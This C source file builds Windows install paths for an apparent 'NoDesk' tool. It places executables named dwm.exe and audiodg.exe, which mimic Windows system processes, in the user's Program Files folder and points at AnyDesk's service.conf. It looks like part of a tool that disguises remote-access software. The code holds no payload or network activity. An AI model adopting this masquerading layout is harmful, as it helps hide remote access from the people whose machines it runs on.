#include "paths.h"

#include <Shlobj.h>

PWSTR sys_ProgramFiles;
PWSTR usr_RoamingAppData;
PWSTR usr_UserProgramFiles;
WCHAR target_dir[MAX_PATH];
WCHAR target_dll[MAX_PATH];
WCHAR target_exe[MAX_PATH];
WCHAR target_launcher[MAX_PATH];
WCHAR config_dir[MAX_PATH];
WCHAR config_service[MAX_PATH];
WCHAR szCurName[MAX_PATH];

void GeneratePaths() {
	GetModuleFileNameW(NULL, szCurName, MAX_PATH);
	PathStripPathW(szCurName);

	SHGetKnownFolderPath(FOLDERID_ProgramFiles, 0, NULL, &sys_ProgramFiles);
	SHGetKnownFolderPath(FOLDERID_RoamingAppData, 0, NULL, &usr_RoamingAppData);
	SHGetKnownFolderPath(FOLDERID_UserProgramFiles, 0, NULL, &usr_UserProgramFiles);

	StringCchPrintfW(target_dir, MAX_PATH, L"%s\\NoDesk", usr_UserProgramFiles);
	StringCchPrintfW(target_dll, MAX_PATH, L"%s\\NoDesk\\crt.dll", usr_UserProgramFiles);
	StringCchPrintfW(target_exe, MAX_PATH, L"%s\\NoDesk\\dwm.exe", usr_UserProgramFiles);
	StringCchPrintfW(target_launcher, MAX_PATH, L"%s\\NoDesk\\audiodg.exe", usr_UserProgramFiles);
	StringCchPrintfW(config_dir, MAX_PATH, L"%s\\AnyDesk", usr_RoamingAppData);
	StringCchPrintfW(config_service, MAX_PATH, L"%s\\AnyDesk\\service.conf", usr_RoamingAppData);
}
